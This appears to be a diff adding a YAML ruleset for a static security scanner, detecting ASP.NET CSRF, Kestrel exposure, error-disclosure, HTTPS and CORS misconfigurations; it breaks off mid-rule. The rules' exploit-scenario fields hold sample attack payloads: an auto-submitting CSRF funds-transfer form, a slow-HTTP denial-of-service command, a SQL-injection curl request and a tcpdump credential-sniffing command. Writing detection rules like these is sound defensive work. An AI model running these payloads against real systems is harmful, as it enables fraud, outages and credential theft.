@@ -1,0 +1,1119 @@
+rules:
+  # ============================================================
+  # ASP.NET RULES (FW-ASPNET-001 to FW-ASPNET-006)
+  # ============================================================
+
+  - rule_id: "FW-ASPNET-001"
+    title: "Missing ValidateAntiForgeryToken in ASP.NET MVC"
+    description: >
+      Detects ASP.NET MVC controller actions that accept POST, PUT, or DELETE
+      requests without the [ValidateAntiForgeryToken] attribute. Without this
+      protection, forms and state-changing endpoints are vulnerable to
+      cross-site request forgery (CSRF) attacks where malicious sites can
+      submit forged requests on behalf of authenticated users.
+    language: csharp
+    category: framework_misuse
+    severity: High
+    confidence: 0.88
+    cwe: CWE-352
+    owasp: "A01:2021-Broken Access Control"
+    tags:
+      - aspnet
+      - csrf
+      - antiforgery
+      - mvc
+      - web-security
+      - csharp
+    detection_layer: 4
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: '\[HttpPost\]\s*\n\s*public\s+(?:async\s+)?(?:Task<)?(?:IActionResult|ActionResult|JsonResult)'
+        description: "HttpPost action without ValidateAntiForgeryToken"
+      - type: regex
+        pattern: '\[HttpDelete\]\s*\n\s*public\s+(?:async\s+)?(?:Task<)?(?:IActionResult|ActionResult)'
+        description: "HttpDelete action without CSRF protection"
+      - type: regex
+        pattern: '\[HttpPut\]\s*\n\s*public\s+(?:async\s+)?(?:Task<)?(?:IActionResult|ActionResult)'
+        description: "HttpPut action without CSRF protection"
+      - type: regex
+        pattern: '\[HttpPatch\]\s*\n\s*public\s+(?:async\s+)?(?:Task<)?(?:IActionResult|ActionResult)'
+        description: "HttpPatch action without CSRF protection"
+      - type: regex
+        pattern: '\[HttpPost\]\s*\n\s*\[Route\("[^"]+"\)\]\s*\n\s*public'
+        description: "Routed POST action without CSRF token validation"
+      - type: regex
+        pattern: 'options\.Filters\.Add\s*\(\s*new\s+IgnoreAntiforgeryTokenAttribute'
+        description: "Antiforgery token validation globally disabled"
+    anti_patterns:
+      - '\[ValidateAntiForgeryToken\]'
+      - '\[AutoValidateAntiforgeryToken\]'
+      - 'services\.AddAntiforgery'
+      - 'options\.Filters\.Add\s*\(\s*new\s+AutoValidateAntiforgeryTokenAttribute'
+      - '\[IgnoreAntiforgeryToken\]'
+      - 'IAntiforgery'
+      - 'AntiforgeryToken\s*\(\s*\)'
+      - '@Html\.AntiForgeryToken\s*\(\s*\)'
+      - 'ValidateAntiForgeryToken'
+      - 'app\.UseAntiforgery\s*\(\s*\)'
+      - 'services\.AddControllersWithViews\s*\([^)]*options\s*=>[^)]*AutoValidateAntiforgeryToken'
+      - '\[ApiController\]'
+      - 'Authorization.*Bearer'
+      - 'AddAuthentication.*JwtBearer'
+      - 'csrf-token'
+    bypass_variants:
+      - description: "AutoValidateAntiforgeryToken on class but IgnoreAntiforgeryToken on method"
+        pattern: '\[IgnoreAntiforgeryToken\]\s*\n\s*\[Http(Post|Put|Delete)\]'
+      - description: "Antiforgery configured but token not included in AJAX requests"
+        pattern: '\$\.ajax\s*\(\s*\{[^}]*type\s*:\s*["\x27]POST["\x27](?![\s\S]*?RequestVerificationToken)'
+      - description: "API controller without CSRF but accepting cookies for auth"
+        pattern: '\[ApiController\][\s\S]*?Cookie[\s\S]*?\[HttpPost\](?![\s\S]*?\[ValidateAntiForgeryToken\])'
+    evasion_indicators:
+      - "CSRF protection on forms but not on AJAX endpoints"
+      - "Custom CSRF implementation that does not validate properly"
+      - "SameSite cookie not set allowing cross-site cookie inclusion"
+    encoding_variants:
+      - type: "custom_filter"
+        pattern: 'class\s+\w+AntiForgery\w*\s*:\s*\w+Attribute'
+      - type: "middleware_csrf"
+        pattern: 'app\.Use\s*\(\s*async\s*\([^)]*\)\s*=>[\s\S]*?antiforgery'
+    multi_function_chain_patterns:
+      - "[HttpPost] -> controller.Action(model) -> database.Save() [no CSRF] -> state change via CSRF"
+      - "[HttpDelete] -> controller.Delete(id) -> repository.Remove() [no CSRF] -> data deletion"
+      - "[HttpPost] -> account.Transfer(dto) -> bankService.Transfer() [no CSRF] -> financial fraud"
+    privilege_context_flags:
+      requires_auth_context: true
+      admin_only_risk: false
+      escalation_vector: "CSRF enables attackers to perform actions on behalf of authenticated users"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: false
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "Cross-origin form submission from attacker's site"
+        sink: "State-changing controller action"
+        through: "Missing ValidateAntiForgeryToken attribute"
+    impact: |
+      Without CSRF protection, an attacker can create a malicious webpage
+      that submits forms or AJAX requests to the vulnerable application.
+      When an authenticated user visits the attacker's page, the browser
+      automatically includes the authentication cookie. The application
+      processes the request as a legitimate action by the user, enabling
+      unauthorized fund transfers, account modifications, data deletion,
+      and privilege changes.
+    remediation: |
+      Apply anti-forgery token validation globally or per-action:
+
+      ```csharp
+      // Global auto-validation in Startup.cs
+      services.AddControllersWithViews(options =>
+      {
+          options.Filters.Add(new AutoValidateAntiforgeryTokenAttribute());
+      });
+
+      // Or per-controller
+      [AutoValidateAntiforgeryToken]
+      public class AccountController : Controller
+      {
+          [HttpPost]
+          public async Task<IActionResult> Transfer(TransferModel model)
+          {
+              // Protected by class-level attribute
+              await _bankService.TransferAsync(model);
+              return RedirectToAction("Index");
+          }
+      }
+
+      // In views, include the token
+      @using (Html.BeginForm())
+      {
+          @Html.AntiForgeryToken()
+          // form fields
+      }
+      ```
+    references:
+      - "https://learn.microsoft.com/en-us/aspnet/core/security/anti-request-forgery"
+      - "https://cwe.mitre.org/data/definitions/352.html"
+      - "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - '\[HttpPost\]'
+        - '\[HttpPut\]'
+        - '\[HttpDelete\]'
+        - ':\s*Controller'
+      taint_source_indicators:
+        - '\[FromBody\]'
+        - '\[FromForm\]'
+        - 'Request\.Form'
+      taint_sink_indicators:
+        - '\.SaveChanges\s*\('
+        - '\.SaveChangesAsync\s*\('
+        - '\.ExecuteNonQuery\s*\('
+      sanitization_patterns:
+        - '\[ValidateAntiForgeryToken\]'
+        - '\[AutoValidateAntiforgeryToken\]'
+        - 'IAntiforgery'
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (financial_action ? 1.5 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A banking ASP.NET MVC application has a fund transfer action at
+        /Account/Transfer that accepts POST requests without
+        [ValidateAntiForgeryToken]. An attacker creates a page with a
+        hidden form that auto-submits to /Account/Transfer with the
+        attacker's account as the recipient. When an authenticated user
+        visits the attacker's page, funds are transferred without consent.
+      example_payload: '<form action="https://bank.target.com/Account/Transfer" method="POST"><input type="hidden" name="ToAccount" value="attacker-acct"/><input type="hidden" name="Amount" value="10000"/></form><script>document.forms[0].submit();</script>'
+      attacker_objective: "Execute state-changing actions on behalf of authenticated users via CSRF"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "medium"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "framework-aware"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "FW-ASPNET-004"
+        - "FW-ASPNET-005"
+        - "FW-DJANGO-004"
+
+  - rule_id: "FW-ASPNET-002"
+    title: "Kestrel Server Exposed Without Reverse Proxy"
+    description: >
+      Detects ASP.NET Core applications that configure Kestrel to listen on
+      public interfaces or high-traffic ports without being behind a reverse
+      proxy (nginx, IIS, or a cloud load balancer). Kestrel is designed as
+      an edge-case web server and lacks the hardening, rate limiting, request
+      filtering, and DoS protection that a reverse proxy provides. Direct
+      exposure risks denial of service and exploitation of edge-case HTTP
+      parsing vulnerabilities.
+    language: csharp
+    category: framework_misuse
+    severity: High
+    confidence: 0.82
+    cwe: CWE-16
+    owasp: "A05:2021-Security Misconfiguration"
+    tags:
+      - aspnet
+      - kestrel
+      - reverse-proxy
+      - deployment
+      - misconfiguration
+      - csharp
+    detection_layer: 4
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'webBuilder\.UseUrls\s*\(\s*"http://0\.0\.0\.0'
+        description: "Kestrel listening on all interfaces via UseUrls"
+      - type: regex
+        pattern: 'webBuilder\.UseUrls\s*\(\s*"http://\*:'
+        description: "Kestrel wildcard binding"
+      - type: regex
+        pattern: 'options\.Listen\s*\(\s*IPAddress\.Any'
+        description: "Kestrel listening on any IP address"
+      - type: regex
+        pattern: 'Kestrel.*Endpoints.*Url.*http://\*'
+        description: "Kestrel endpoint wildcard in configuration"
+      - type: regex
+        pattern: '"Kestrel"\s*:\s*\{[\s\S]*?"Url"\s*:\s*"http://0\.0\.0\.0'
+        description: "Kestrel configuration with public binding in appsettings"
+      - type: regex
+        pattern: 'options\.ListenAnyIP\s*\(\s*\d+'
+        description: "KestrelServerOptions ListenAnyIP"
+      - type: regex
+        pattern: 'UseKestrel\s*\(\s*\)[\s\S]*?\.UseUrls\s*\(\s*"http://\+'
+        description: "UseKestrel with public URL binding"
+      - type: regex
+        pattern: 'ASPNETCORE_URLS\s*=\s*http://0\.0\.0\.0'
+        description: "Environment variable binding Kestrel to public interface"
+    anti_patterns:
+      - 'UseIISIntegration'
+      - 'UseIIS\s*\(\s*\)'
+      - 'UseNginx'
+      - 'ForwardedHeaders'
+      - 'UseForwardedHeaders'
+      - 'options\.Listen\s*\(\s*IPAddress\.Loopback'
+      - '"Url"\s*:\s*"http://localhost'
+      - '"Url"\s*:\s*"http://127\.0\.0\.1'
+      - 'ReverseProxy'
+      - 'ProxyOptions'
+      - 'KnownProxies'
+      - 'KnownNetworks'
+      - 'options\.Limits\.MaxConcurrentConnections'
+      - 'options\.Limits\.MaxRequestBodySize'
+      - 'options\.Limits\.RequestHeadersTimeout'
+    bypass_variants:
+      - description: "Kestrel behind reverse proxy but without forwarded headers middleware"
+        pattern: 'UseKestrel[\s\S]*?Listen\s*\(\s*IPAddress\.Any[\s\S]*?(?!UseForwardedHeaders)'
+      - description: "Kestrel on localhost but port forwarded via Docker"
+        pattern: 'Listen\s*\(\s*IPAddress\.Loopback[\s\S]*?EXPOSE\s+\d+'
+      - description: "Kestrel limits set but too generous"
+        pattern: 'MaxRequestBodySize\s*=\s*\d{9,}'
+    evasion_indicators:
+      - "Kestrel binding configured via environment variables in deployment"
+      - "Docker EXPOSE directive making Kestrel port accessible"
+      - "Kubernetes service exposing Kestrel directly without ingress"
+    encoding_variants:
+      - type: "env_url"
+        pattern: 'ASPNETCORE_URLS\s*=\s*http://\*'
+      - type: "json_config"
+        pattern: '"Endpoints"\s*:\s*\{\s*"\w+"\s*:\s*\{\s*"Url"\s*:\s*"http://0\.0\.0\.0'
+    multi_function_chain_patterns:
+      - "UseKestrel() -> ListenAnyIP(80) -> no reverse proxy -> direct internet exposure"
+      - "UseUrls('http://*:5000') -> no rate limiting -> DoS vulnerability"
+      - "ListenAnyIP(443) -> no WAF -> vulnerability exploitation"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Direct Kestrel exposure allows DoS and exploitation without proxy protections"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: false
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "Raw HTTP request from internet"
+        sink: "Kestrel HTTP parser"
+        through: "Direct exposure without reverse proxy"
+    impact: |
+      Exposing Kestrel directly to the internet without a reverse proxy
+      removes multiple layers of defense. Kestrel lacks advanced request
+      filtering, rate limiting, connection draining, and slow-loris attack
+      protection that servers like nginx or IIS provide. Attackers can
+      exploit HTTP parsing edge cases, perform denial-of-service attacks
+      with relatively low bandwidth, and bypass security controls that
+      would normally be enforced at the reverse proxy layer.
+    remediation: |
+      Deploy Kestrel behind a reverse proxy:
+
+      ```csharp
+      // Program.cs - Configure Kestrel with proper limits
+      builder.WebHost.ConfigureKestrel(options =>
+      {
+          options.Listen(IPAddress.Loopback, 5000); // Localhost only
+          options.Limits.MaxConcurrentConnections = 100;
+          options.Limits.MaxRequestBodySize = 10 * 1024 * 1024; // 10MB
+          options.Limits.RequestHeadersTimeout = TimeSpan.FromSeconds(30);
+      });
+
+      // Configure forwarded headers for proxy
+      builder.Services.Configure<ForwardedHeadersOptions>(options =>
+      {
+          options.ForwardedHeaders = ForwardedHeaders.XForwardedFor
+              | ForwardedHeaders.XForwardedProto;
+          options.KnownProxies.Add(IPAddress.Parse("10.0.0.1"));
+      });
+
+      app.UseForwardedHeaders();
+      ```
+    references:
+      - "https://learn.microsoft.com/en-us/aspnet/core/fundamentals/servers/kestrel"
+      - "https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/proxy-load-balancer"
+      - "https://cwe.mitre.org/data/definitions/16.html"
+      - "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'UseKestrel'
+        - 'ConfigureKestrel'
+        - 'KestrelServerOptions'
+        - 'WebHost'
+      taint_source_indicators:
+        - 'Request\.Body'
+        - 'Request\.Headers'
+        - 'Request\.Query'
+      taint_sink_indicators:
+        - 'Listen\s*\('
+        - 'ListenAnyIP\s*\('
+        - 'UseUrls\s*\('
+      sanitization_patterns:
+        - 'UseForwardedHeaders'
+        - 'UseIISIntegration'
+        - 'IPAddress\.Loopback'
+    severity_scoring:
+      severity_weight: 7
+      risk_score_formula_hint: "severity_weight * confidence * (internet_exposed ? 1.5 : 1.0)"
+      exploitability_score: "Medium"
+    exploit_scenario:
+      attack_example: |
+        An ASP.NET Core application runs Kestrel directly on port 80 bound
+        to 0.0.0.0 in a cloud environment. An attacker uses slowloris
+        techniques, sending partial HTTP requests that keep connections open.
+        Without a reverse proxy to impose connection timeouts and limits,
+        Kestrel's connection pool is exhausted, causing denial of service
+        for all users. The attacker maintains the attack with minimal
+        bandwidth.
+      example_payload: "slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u https://target.com/ -x 24 -p 3"
+      attacker_objective: "Exhaust Kestrel resources via slow HTTP attacks without reverse proxy protection"
+    confidence_factors:
+      pattern_strength: "medium"
+      context_match: "high"
+      proximity_to_user_input: "low"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "framework-aware"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "FW-ASPNET-003"
+        - "FW-ASPNET-004"
+
+  - rule_id: "FW-ASPNET-003"
+    title: "Detailed Errors Exposed in Production ASP.NET Application"
+    description: >
+      Detects ASP.NET applications that display detailed error information
+      in production, including stack traces, source code, and configuration
+      details. This occurs when UseDeveloperExceptionPage() is used without
+      environment checks, custom error pages are disabled, or
+      customErrors/httpErrors are set to Off in web.config.
+    language: csharp
+    category: framework_misuse
+    severity: High
+    confidence: 0.90
+    cwe: CWE-209
+    owasp: "A05:2021-Security Misconfiguration"
+    tags:
+      - aspnet
+      - error-handling
+      - information-disclosure
+      - stack-trace
+      - misconfiguration
+      - csharp
+    detection_layer: 4
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'app\.UseDeveloperExceptionPage\s*\(\s*\)'
+        description: "Developer exception page used unconditionally"
+      - type: regex
+        pattern: 'UseDeveloperExceptionPage\s*\(\s*\)(?![\s\S]*?IsDevelopment)'
+        description: "Developer exception page without environment check"
+      - type: regex
+        pattern: 'customErrors\s+mode\s*=\s*"Off"'
+        description: "Custom errors disabled in web.config"
+      - type: regex
+        pattern: 'httpErrors\s+errorMode\s*=\s*"Detailed"'
+        description: "Detailed HTTP errors enabled in web.config"
+      - type: regex
+        pattern: '<compilation\s+debug\s*=\s*"true"'
+        description: "Compilation debug mode enabled in web.config"
+      - type: regex
+        pattern: 'IncludeExceptionDetailInFaults\s*=\s*true'
+        description: "WCF exception details exposed in faults"
+      - type: regex
+        pattern: 'options\.SuppressMapClientErrors\s*=\s*true'
+        description: "Client error mapping suppressed showing raw errors"
+      - type: regex
+        pattern: 'app\.UseStatusCodePages\s*\(\s*\)(?![\s\S]*?UseExceptionHandler)'
+        description: "Status code pages without proper exception handler"
+    anti_patterns:
+      - 'if\s*\(\s*\w+\.IsDevelopment\s*\(\s*\)\s*\)[\s\S]*?UseDeveloperExceptionPage'
+      - 'app\.UseExceptionHandler\s*\(\s*"\/\w+'
+      - 'UseExceptionHandler\s*\(\s*\)'
+      - 'customErrors\s+mode\s*=\s*"(RemoteOnly|On)"'
+      - 'httpErrors\s+errorMode\s*=\s*"Custom"'
+      - 'UseStatusCodePagesWithReExecute'
+      - 'UseHsts\s*\(\s*\)'
+      - 'ProblemDetails'
+      - 'app\.UseExceptionHandler'
+      - 'ExceptionHandlerMiddleware'
+      - 'GlobalExceptionHandler'
+      - 'AddProblemDetails'
+      - 'compilation\s+debug\s*=\s*"false"'
+      - 'ASPNETCORE_ENVIRONMENT.*Production'
+      - 'IExceptionHandler'
+    bypass_variants:
+      - description: "Environment check present but ASPNETCORE_ENVIRONMENT not set"
+        pattern: 'IsDevelopment\s*\(\s*\)[\s\S]*?UseDeveloperExceptionPage[\s\S]*?else[\s\S]*?UseExceptionHandler\s*\(\s*"\/Error"'
+      - description: "Custom error handler that still includes stack trace"
+        pattern: 'UseExceptionHandler[\s\S]*?context\.Features\.Get<IExceptionHandlerFeature>[\s\S]*?Exception\.StackTrace'
+      - description: "Error page returns exception details in API responses"
+        pattern: 'catch\s*\(\s*Exception\s+\w+\s*\)[\s\S]*?return\s+\w+\(\s*\w+\.Message'
+    evasion_indicators:
+      - "Environment variable not properly set in production deployment"
+      - "Custom exception filter that exposes details in specific error codes"
+      - "Logging middleware that inadvertently returns error details in response"
+    encoding_variants:
+      - type: "middleware_order"
+        pattern: 'UseDeveloperExceptionPage[\s\S]*?(?:UseRouting|UseEndpoints)'
+      - type: "conditional_bypass"
+        pattern: '#if\s+DEBUG[\s\S]*?UseDeveloperExceptionPage'
+    multi_function_chain_patterns:
+      - "UseDeveloperExceptionPage() -> exception thrown -> full stack trace in response"
+      - "customErrors=Off -> unhandled exception -> ASP.NET yellow screen of death"
+      - "IncludeExceptionDetailInFaults=true -> WCF fault -> internal details exposed"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Error details reveal code paths, database schemas, and internal architecture"
+    business_logic_indicator:
+      financial_impact: false
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "Any HTTP request triggering an unhandled exception"
+        sink: "Detailed error response to client"
+        through: "Developer exception page or disabled custom errors"
+    impact: |
+      Detailed error pages in production reveal full stack traces with source
+      code, file paths, database connection strings, internal class names,
+      method signatures, and configuration values. This information enables
+      targeted attacks by revealing the application's internal structure,
+      technology stack, and potential vulnerability points. SQL exceptions
+      may reveal database schemas. File path exceptions reveal server layout.
+    remediation: |
+      Configure proper error handling for production:
+
+      ```csharp
+      // Program.cs
+      if (app.Environment.IsDevelopment())
+      {
+          app.UseDeveloperExceptionPage();
+      }
+      else
+      {
+          app.UseExceptionHandler("/Error");
+          app.UseHsts();
+      }
+
+      // For APIs, use ProblemDetails
+      builder.Services.AddProblemDetails(options =>
+      {
+          options.CustomizeProblemDetails = context =>
+          {
+              context.ProblemDetails.Extensions.Remove("exception");
+              context.ProblemDetails.Detail = "An error occurred.";
+          };
+      });
+      ```
+
+      ```xml
+      <!-- web.config -->
+      <system.web>
+          <customErrors mode="On" defaultRedirect="~/Error" />
+          <compilation debug="false" />
+      </system.web>
+      ```
+    references:
+      - "https://learn.microsoft.com/en-us/aspnet/core/fundamentals/error-handling"
+      - "https://cwe.mitre.org/data/definitions/209.html"
+      - "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
+      - "https://learn.microsoft.com/en-us/aspnet/core/fundamentals/environments"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'UseDeveloperExceptionPage'
+        - 'UseExceptionHandler'
+        - 'customErrors'
+        - 'IsDevelopment'
+      taint_source_indicators:
+        - 'Exception'
+        - 'StackTrace'
+        - 'InnerException'
+      taint_sink_indicators:
+        - 'Response\.Write'
+        - 'return\s+\w+\(\s*\w+\.Message'
+        - 'Content\s*\(\s*\w+\.ToString'
+      sanitization_patterns:
+        - 'IsDevelopment\s*\(\s*\)'
+        - 'UseExceptionHandler'
+        - 'customErrors.*mode.*On'
+    severity_scoring:
+      severity_weight: 7
+      risk_score_formula_hint: "severity_weight * confidence * (database_errors_exposed ? 1.5 : 1.0)"
+      exploitability_score: "Medium"
+    exploit_scenario:
+      attack_example: |
+        An ASP.NET Core application uses UseDeveloperExceptionPage() without
+        an environment check. An attacker sends a request with an invalid
+        parameter that causes a database exception. The developer exception
+        page displays the full stack trace including the SQL query, database
+        connection string with credentials, internal file paths, and ORM
+        mapping details. The attacker uses the connection string to access
+        the database directly.
+      example_payload: "curl 'https://target.com/api/users?id=1%27%20OR%201=1--' -v"
+      attacker_objective: "Extract sensitive internal information from detailed error pages"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "low"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "framework-aware"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "FW-ASPNET-002"
+        - "FW-ASPNET-004"
+        - "FW-DJANGO-001"
+
+  - rule_id: "FW-ASPNET-004"
+    title: "Missing HTTPS Redirection in ASP.NET Application"
+    description: >
+      Detects ASP.NET applications that do not enforce HTTPS through
+      UseHttpsRedirection(), UseHsts(), or the [RequireHttps] attribute.
+      Without HTTPS enforcement, sensitive data including credentials,
+      session tokens, and personal information is transmitted in cleartext,
+      vulnerable to interception by network attackers via man-in-the-middle
+      attacks, Wi-Fi eavesdropping, and traffic sniffing.
+    language: csharp
+    category: framework_misuse
+    severity: High
+    confidence: 0.85
+    cwe: CWE-311
+    owasp: "A02:2021-Cryptographic Failures"
+    tags:
+      - aspnet
+      - https
+      - tls
+      - encryption
+      - transport-security
+      - csharp
+    detection_layer: 4
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'app\.UseRouting\s*\(\s*\)(?![\s\S]*?UseHttpsRedirection)'
+        description: "Routing used without HTTPS redirection"
+      - type: regex
+        pattern: 'app\.UseAuthorization\s*\(\s*\)(?![\s\S]*?UseHsts)'
+        description: "Authorization without HSTS enforcement"
+      - type: regex
+        pattern: 'webBuilder\.UseUrls\s*\(\s*"http://'
+        description: "Application configured to listen on HTTP only"
+      - type: regex
+        pattern: '"Kestrel"[\s\S]*?"Url"\s*:\s*"http://'
+        description: "Kestrel endpoint configured for HTTP"
+      - type: regex
+        pattern: 'HstsOptions[\s\S]*?MaxAge\s*=\s*TimeSpan\.FromDays\s*\(\s*[0-9]\s*\)'
+        description: "HSTS max age too short (less than 10 days)"
+      - type: regex
+        pattern: 'RequireHttpsMetadata\s*=\s*false'
+        description: "HTTPS metadata requirement disabled"
+    anti_patterns:
+      - 'app\.UseHttpsRedirection\s*\(\s*\)'
+      - 'app\.UseHsts\s*\(\s*\)'
+      - '\[RequireHttps\]'
+      - 'options\.Filters\.Add\s*\(\s*new\s+RequireHttpsAttribute'
+      - 'services\.AddHttpsRedirection'
+      - 'HstsOptions'
+      - 'UseUrls.*https://'
+      - 'ListenAnyIP.*useHttps'
+      - 'options\.Limits\.MaxRequestBodySize'
+      - 'AddHsts'
+      - 'Strict-Transport-Security'
+      - 'SslPort\s*='
+      - 'options\.SslPort\s*='
+      - 'HttpsRedirectionOptions'
+      - 'HTTPS_PORT'
+    bypass_variants:
+      - description: "HTTPS redirection in middleware but not enforced for API routes"
+        pattern: 'UseHttpsRedirection[\s\S]*?MapControllers(?![\s\S]*?\[RequireHttps\])'
+      - description: "HSTS set but with includeSubDomains disabled"
+        pattern: 'HstsOptions[\s\S]*?IncludeSubDomains\s*=\s*false'
+      - description: "HTTPS redirect only in production but staging uses HTTP"
+        pattern: 'if\s*\(\s*\w+\.IsProduction[\s\S]*?UseHttpsRedirection'
+    evasion_indicators:
+      - "HTTPS handled at load balancer but internal traffic is HTTP"
+      - "TLS termination at CDN layer not visible in application code"
+      - "Docker container uses HTTP internally with reverse proxy"
+    encoding_variants:
+      - type: "env_url"
+        pattern: 'ASPNETCORE_URLS\s*=\s*http://(?![\s\S]*https://)'
+      - type: "config_json"
+        pattern: '"https_port"\s*:\s*null'
+    multi_function_chain_patterns:
+      - "HTTP listen -> credential form submission -> plaintext credential transmission"
+      - "HTTP listen -> session cookie sent -> session hijacking on public Wi-Fi"
+      - "HTTP listen -> API token in Authorization header -> token theft via MITM"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Cleartext traffic interception enables credential and session theft"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "User credentials and sensitive data in HTTP request"
+        sink: "Network transmission over cleartext HTTP"
+        through: "Missing HTTPS enforcement"
+    impact: |
+      Without HTTPS enforcement, all data transmitted between the client
+      and server is vulnerable to interception. Attackers on the same
+      network can capture login credentials, session cookies, API tokens,
+      personal data, and financial information. This violates PCI DSS,
+      HIPAA, GDPR, and other compliance frameworks that require encryption
+      in transit for sensitive data.
+    remediation: |
+      Enforce HTTPS and HSTS in ASP.NET Core:
+
+      ```csharp
+      // Program.cs
+      var builder = WebApplication.CreateBuilder(args);
+
+      builder.Services.AddHsts(options =>
+      {
+          options.MaxAge = TimeSpan.FromDays(365);
+          options.IncludeSubDomains = true;
+          options.Preload = true;
+      });
+
+      builder.Services.AddHttpsRedirection(options =>
+      {
+          options.RedirectStatusCode = StatusCodes.Status308PermanentRedirect;
+          options.HttpsPort = 443;
+      });
+
+      var app = builder.Build();
+
+      if (!app.Environment.IsDevelopment())
+      {
+          app.UseHsts();
+      }
+
+      app.UseHttpsRedirection();
+      ```
+    references:
+      - "https://learn.microsoft.com/en-us/aspnet/core/security/enforcing-ssl"
+      - "https://cwe.mitre.org/data/definitions/311.html"
+      - "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'WebApplication\.CreateBuilder'
+        - 'app\.UseRouting'
+        - 'app\.UseAuthorization'
+        - 'Startup\.Configure'
+      taint_source_indicators:
+        - 'Request\.Form'
+        - 'Request\.Headers\["Authorization"\]'
+        - 'Request\.Cookies'
+      taint_sink_indicators:
+        - 'Response\.Write'
+        - 'Json\s*\('
+      sanitization_patterns:
+        - 'UseHttpsRedirection'
+        - 'UseHsts'
+        - '\[RequireHttps\]'
+    severity_scoring:
+      severity_weight: 7
+      risk_score_formula_hint: "severity_weight * confidence * (handles_auth ? 1.5 : 1.0)"
+      exploitability_score: "Medium"
+    exploit_scenario:
+      attack_example: |
+        An ASP.NET application serves login forms over HTTP without HTTPS
+        redirection. On a public Wi-Fi network, an attacker uses Wireshark
+        to capture network traffic. When a victim submits their login
+        credentials, the attacker captures the plaintext username and
+        password from the HTTP POST request. The attacker then uses these
+        credentials to access the victim's account.
+      example_payload: "sudo tcpdump -i wlan0 -A 'host target.com and port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'"
+      attacker_objective: "Intercept sensitive data transmitted over unencrypted HTTP connections"
+    confidence_factors:
+      pattern_strength: "medium"
+      context_match: "high"
+      proximity_to_user_input: "medium"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "framework-aware"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "FW-ASPNET-001"
+        - "FW-ASPNET-002"
+        - "FW-ASPNET-005"
+
+  - rule_id: "FW-ASPNET-005"
+    title: "Insecure CORS Policy in ASP.NET Core"
+    description: >
+      Detects ASP.NET Core applications that configure CORS with overly
+      permissive policies, such as AllowAnyOrigin(), AllowAnyMethod(), or
+      combining AllowAnyOrigin with AllowCredentials. This enables any
+      website to make cross-origin requests to the API, potentially with
+      the user's authentication cookies, leading to data theft and
+      unauthorized actions.
+    language: csharp
+    category: framework_misuse
+    severity: High
+    confidence: 0.89
+    cwe: CWE-942
+    owasp: "A05:2021-Security Misconfiguration"
+    tags:
+      - aspnet
+      - cors
+      - cross-origin
+      - misconfiguration
+      - api-security
+      - csharp
+    detection_layer: 4
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: '\.AllowAnyOrigin\s*\(\s*\)'
+        description: "CORS allowing any origin"
+      - type: regex
+        pattern: '\.WithOrigins\s*\(\s*"\*"\s*\)'
+        description: "CORS with wildcard origin"
+      - type: regex
+        pattern: '\.AllowAnyOrigin\s*\(\s*\)[\s\S]*?\.AllowCredentials\s*\(\s*\)'
+        description: "Any origin with credentials - maximum risk"
+      - type: regex
+        pattern: '\.AllowAnyMethod\s*\(\s*\)[\s\S]*?\.AllowAnyHeader\s*\(\s*\)[\s\S]*?\.AllowAnyOrigin\s*\(\s*\)'
+        description: "Fully permissive CORS policy"
+      - type: regex
+        pattern: '\.SetIsOriginAllowed\s*\(\s*_\s*=>\s*true\s*\)'
